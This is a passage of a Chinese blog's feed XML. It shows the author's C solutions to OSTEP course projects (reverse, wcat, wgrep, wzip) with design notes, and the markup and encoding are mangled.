punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">getline</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token punctuation">(</span>cur<span class="token operator">-></span>line_buf<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>sz<span class="token punctuation">,</span> fp<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// è¯»åˆ°æ–‡ä»¶æœ«å°¾ï¼Œåˆ å»å½“å‰æ— æ•ˆç»“ç‚¹å¹¶ç»“æŸå¾ªç¯</span>line_node<span class="token operator">*</span> temp <span class="token operator">=</span> cur<span class="token punctuation">;</span>cur <span class="token operator">=</span> pre<span class="token punctuation">;</span><span class="token function">free</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>cur<span class="token operator">-></span>next <span class="token operator">=</span> pre<span class="token punctuation">;</span> <span class="token comment">// é“¾è¡¨åè½¬</span>pre <span class="token operator">=</span> cur<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> cur<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// å†™å…¥åè½¬åçš„æ•°æ®åˆ°æ–‡ä»¶fp</span><span class="token keyword">void</span> <span class="token function">write_to_file</span><span class="token punctuation">(</span>line_node<span class="token operator">*</span> cur<span class="token punctuation">,</span> FILE<span class="token operator">*</span> fp<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>cur <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">fprintf</span><span class="token punctuation">(</span>fp<span class="token punctuation">,</span> <span class="token string">"%s"</span><span class="token punctuation">,</span> cur<span class="token operator">-></span>line_buf<span class="token punctuation">)</span><span class="token punctuation">;</span>line_node<span class="token operator">*</span> temp <span class="token operator">=</span> cur<span class="token punctuation">;</span>cur <span class="token operator">=</span> cur<span class="token operator">-></span>next<span class="token punctuation">;</span><span class="token function">free</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>line_node<span class="token operator">*</span> cur <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>cur <span class="token operator">=</span> <span class="token function">read_from_file</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">write_to_file</span><span class="token punctuation">(</span>cur<span class="token punctuation">,</span> <span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">>=</span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> argc <span class="token operator">&lt;=</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>FILE<span class="token operator">*</span> fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fp <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"reverse: cannot open file '%s'\n"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>cur <span class="token operator">=</span> <span class="token function">read_from_file</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">write_to_file</span><span class="token punctuation">(</span>cur<span class="token punctuation">,</span> <span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>FILE<span class="token operator">*</span> fp2 <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fp2 <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"reverse: cannot open file '%s'\n"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_same_file</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"reverse: input and output file must differ\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">write_to_file</span><span class="token punctuation">(</span>cur<span class="token punctuation">,</span> fp2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span>fp2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"usage: reverse &lt;input> &lt;output>\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>]]></content>
    
    
    <summary type="html">&lt;p&gt;æœ¬æ–‡å°†ä»‹ç»æ“ä½œç³»ç»Ÿå¯¼è®ºï¼ˆOperating Systems: Three Easy Piecesï¼‰ä½œè€…æ‰€å¼€æºçš„æ“ä½œç³»ç»Ÿç›¸å…³&lt;a href=&quot;https://github.com/remzi-arpacidusseau/ostep-projects&quot;&gt;è¯¾ç¨‹é¡¹ç›®&lt;/a&gt; çš„ Reverse éƒ¨åˆ†ï¼ŒåŒ…å«ä¸ªäººçš„ä»£ç å®ç°å’Œè®¾è®¡æ€è·¯ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="æ“ä½œç³»ç»Ÿ" scheme="http://lordaeronesz.github.io/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="æ“ä½œç³»ç»Ÿ" scheme="http://lordaeronesz.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="C" scheme="http://lordaeronesz.github.io/tags/C/"/>
    
    <category term="Linux" scheme="http://lordaeronesz.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>OSTEP Projectsï¼šUnix Utilities</title>
    <link href="http://lordaeronesz.github.io/2024/05/04/OSTEP%20Projects%EF%BC%9AUnix%20Utilities/"/>
    <id>http://lordaeronesz.github.io/2024/05/04/OSTEP%20Projects%EF%BC%9AUnix%20Utilities/</id>
    <published>2024-05-04T01:03:08.000Z</published>
    <updated>2024-05-04T10:24:21.316Z</updated>
    
    <content type="html"><![CDATA[<p>æœ¬æ–‡å°†ä»‹ç»æ“ä½œç³»ç»Ÿå¯¼è®ºï¼ˆOperating Systems: Three Easy Piecesï¼‰ä½œè€…æ‰€å¼€æºçš„æ“ä½œç³»ç»Ÿç›¸å…³<a href="https://github.com/remzi-arpacidusseau/ostep-projects">è¯¾ç¨‹é¡¹ç›®</a> çš„ Unix Utilities éƒ¨åˆ†ï¼ŒåŒ…å«ä¸ªäººçš„ä»£ç å®ç°å’Œè®¾è®¡æ€è·¯ã€‚</p><span id="more"></span><h1 id="wcat"><a href="#wcat" class="headerlink" title="wcat"></a>wcat</h1><h2 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>è¦å®ç°ä¸€ä¸ª <code>wcat</code> å‘½ä»¤ï¼Œæ‰“å°ä»æ–‡ä»¶ä¸­è¯»å–åˆ°çš„æ‰€æœ‰å­—ç¬¦ã€‚</p><p>ç¼–å†™ä¸€ä¸ª for å¾ªç¯éå†æ‰€æœ‰çš„å‚æ•°ï¼ˆéœ€è¦è¯»å–çš„æ–‡ä»¶çš„è·¯å¾„ï¼‰ï¼Œæ‰“å¼€è¯¥æ–‡ä»¶ï¼Œä¾ç…§ README ä¸­çš„æç¤ºä½¿ç”¨ <code>fgets()</code> æ¯æ¬¡è¯»å–ä¸€è¡Œï¼Œå¹¶å°†è¯»å–åˆ°çš„å­—ç¬¦ä¸²æ‰“å°åˆ°æ ‡å‡†è¾“å‡ºå³å¯ã€‚</p><h2 id="ä»£ç "><a href="#ä»£ç " class="headerlink" title="ä»£ç "></a>ä»£ç </h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">BUF_SIZE</span> <span class="token expression"><span class="token number">1024</span></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">char</span> buffer<span class="token punctuation">[</span>BUF_SIZE<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> argc<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>FILE<span class="token operator">*</span> fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fp <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"wcat: cannot open file\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">fgets</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">,</span> fp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="wgrep"><a href="#wgrep" class="headerlink" title="wgrep"></a>wgrep</h1><h2 id="æ€è·¯-1"><a href="#æ€è·¯-1" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>è¦å®ç°ä¸€ä¸ª <code>wgrep</code> å‘½ä»¤ï¼Œè¿›è¡Œå­—ç¬¦ä¸²åŒ¹é…ã€‚</p><p>æ ¹æ® README ä¸­çš„æç¤ºï¼Œæœ¬é¢˜æµ‹è¯•æ ·ä¾‹ä¸­ä¸€è¡Œçš„å­—ç¬¦å¯èƒ½ä¼šå¾ˆé•¿ï¼Œå› æ­¤å»ºè®®ä½¿ç”¨ <code>getline()</code> è¿™ç±»åŠ¨æ€åˆ†é…å†…å­˜çš„å‡½æ•°ï¼ˆæ— éœ€é¢„å…ˆæŒ‡å®šç¼“å†²åŒºå¤§å°ï¼‰ã€‚è¿™é‡Œè¦æ±‚å½“åªæœ‰ä¸€ä¸ªå‚æ•° <code>term</code> æ—¶ï¼Œä»æ ‡å‡†è¾“å…¥ä¸­è¯»å–å­—ç¬¦ä¸²ï¼Œè¯»å–æ–¹å¼ä¸ä»æ–‡ä»¶ä¸­è¯»å–ä¸€è‡´ï¼ŒåŒºåˆ«åœ¨äºæ–‡ä»¶æµå‚æ•°çš„ä¸åŒï¼šä»æ–‡ä»¶ä¸­è¯»å–ä¸ºè°ƒç”¨ <code>fopen()</code> è¿”å›çš„æŒ‡é’ˆï¼Œè€Œä»æ ‡å‡†è¾“å…¥è¯»å–ä¸º <code>stdin</code>ã€‚</p><p>æ¯æ¬¡è¯»å–ä¸€è¡Œå­—ç¬¦ä¸²åï¼Œéœ€è¦åˆ¤æ–­è¯¥å­—ç¬¦ä¸²ä¸­æ˜¯å¦å­˜åœ¨æŒ‡å®šçš„å­ä¸² <code>term</code>ï¼Œè¿™å°±å›åˆ°äº†ç»å…¸çš„å­—ç¬¦ä¸²åŒ¹é…çš„é—®é¢˜ä¸Šã€‚ä¸ºäº†ä»£ç ç¼–å†™çš„æ–¹ä¾¿ï¼Œè¿™é‡Œæˆ‘ä½¿ç”¨çš„æ˜¯æœ€ç®€å•çš„æœ´ç´ å­—ç¬¦ä¸²åŒ¹é…ç®—æ³•ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ä½¿ç”¨æœ‰é™è‡ªåŠ¨æœºã€KMP ç®—æ³•ã€Boyer-Moore ç®—æ³•ç­‰æ›´ä¸ºé«˜æ•ˆçš„ç®—æ³•ï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯ï¼ŒUnix ç³»ç»Ÿçš„ <code>grep</code> å‘½ä»¤ä½¿ç”¨çš„æ­£æ˜¯ Boyer-Moore ç®—æ³•ã€‚</p><h2 id="ä»£ç -1"><a href="#ä»£ç -1" class="headerlink" title="ä»£ç "></a>ä»£ç </h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token comment">// æœ´ç´ å­—ç¬¦ä¸²åŒ¹é…ç®—æ³•</span><span class="token keyword">int</span> <span class="token function">match</span><span class="token punctuation">(</span><span class="token keyword">char</span> term<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token class-name">size_t</span> m<span class="token punctuation">,</span> <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token class-name">size_t</span> n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">&lt;</span> m<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n <span class="token operator">-</span> m<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">int</span> flag <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> m<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>term<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">!=</span> buffer<span class="token punctuation">[</span>i <span class="token operator">+</span> j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>flag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">&lt;=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"wgrep: searchterm [file ...]\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">char</span><span class="token operator">*</span> term <span class="token operator">=</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> m <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>term<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">char</span><span class="token operator">*</span> buffer <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> sz <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token class-name">ssize_t</span> n <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// ä»æ ‡å‡†è¾“å…¥ä¸­è¯»å–</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>n <span class="token operator">=</span> <span class="token function">getline</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buffer<span class="token punctuation">,</span> <span class="token operator">&amp;</span>sz<span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">match</span><span class="token punctuation">(</span>term<span class="token punctuation">,</span> m<span class="token punctuation">,</span> buffer<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> argc<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>FILE<span class="token operator">*</span> fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fp <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"wgrep: cannot open file\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>n <span class="token operator">=</span> <span class="token function">getline</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buffer<span class="token punctuation">,</span> <span class="token operator">&amp;</span>sz<span class="token punctuation">,</span> fp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">// åˆ¤æ–­å­—ç¬¦ä¸²æ˜¯å¦åŒ¹é…</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">match</span><span class="token punctuation">(</span>term<span class="token punctuation">,</span> m<span class="token punctuation">,</span> buffer<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="wzip"><a href="#wzip" class="headerlink" title="wzip"></a>wzip</h1><h2 id="æ€è·¯-2"><a href="#æ€è·¯-2" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>å®ç°ä¸€ä¸ªç®€å•çš„å‹ç¼©å‘½ä»¤ï¼Œå°†è¿ç»­é‡å¤çš„å­—ç¬¦å‹ç¼©ä¸º <code>cnt + ch</code>ã€‚</p><p>ç®—æ³•çš„é€»è¾‘å¦‚ä¸‹ï¼š</p><ol><li>å…ˆå°† ch åˆå§‹åŒ–ä¸ºä¸€ä¸ªæ–‡ä»¶ä¸­ä¸ä¼šå‡ºç°çš„å­—ç¬¦ï¼ˆä¾‹å¦‚ <code>&#39;\0&#39;</code>ï¼‰ï¼Œcnt åˆå§‹åŒ–ä¸º 0. </li><li>éå†è¯»å–åˆ°çš„æ¯æ¬¡å­—ç¬¦ï¼Œè‹¥ä¸ ch ç›¸åŒï¼Œåˆ™å°† cnt åŠ  1ï¼›è‹¥ä¸åŒï¼Œåˆ™ä½¿ç”¨ <code>fwrite()</code> å†™å…¥æ ‡å‡†è¾“å‡ºï¼Œå¹¶æŠŠ ch æ›´æ–°ä¸ºå½“å‰å­—ç¬¦ï¼Œcnt ç½®ä¸º 1. æœ€åï¼Œåœ¨æ‰€æœ‰æ–‡ä»¶éå†å®Œæˆåï¼Œå†åˆ¤æ–­ cnt æ˜¯å¦å¤§äº 0ï¼Œè‹¥å¤§äº 0ï¼Œåˆ™å†™å…¥ã€‚</li></ol><p>æ³¨æ„ï¼Œè¿™é‡Œçš„æ‰€æœ‰å­—ç¬¦å‡è¦æŒ‰ç…§è§„åˆ™è¿›è¡Œå‹ç¼©ï¼ŒåŒ…æ‹¬æ¢è¡Œç¬¦ï¼ˆ<code>&#39;\n&#39;</code>ï¼‰ï¼Œæˆ‘æœ€å¼€å§‹å†™çš„æ—¶å€™è¿˜å¯¹æ¢è¡Œç¬¦è¿›è¡Œç‰¹åˆ¤ï¼Œä»¥æ­¤æ¥å¿½ç•¥å¯¹å…¶è¿›è¡Œå¤„ç†ï¼Œå±å®æ˜¯å¤šæ­¤ä¸€ä¸¾äº†ã€‚</p><h2 id="ä»£ç -2"><a href="#ä»£ç -2" class="headerlink" title="ä»£ç "></a>ä»£ç </h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">&lt;=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"wzip: file1 [file2 ...]\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">char</span><span class="token operator">*</span> buffer <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> sz <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token class-name">ssize_t</span> n <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">char</span> ch <span class="token operator">=</span> <span class="token string">'\0'</span><span class="token punctuation">;</span><span class="token keyword">int</span> cnt <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> argc<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>FILE<span class="token operator">*</span> fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fp <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"wzip: cannot open file\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>n <span class="token operator">=</span> <span class="token function">getline</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buffer<span class="token punctuation">,</span> <span class="token operator">&amp;</span>sz<span class="token punctuation">,</span> fp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span 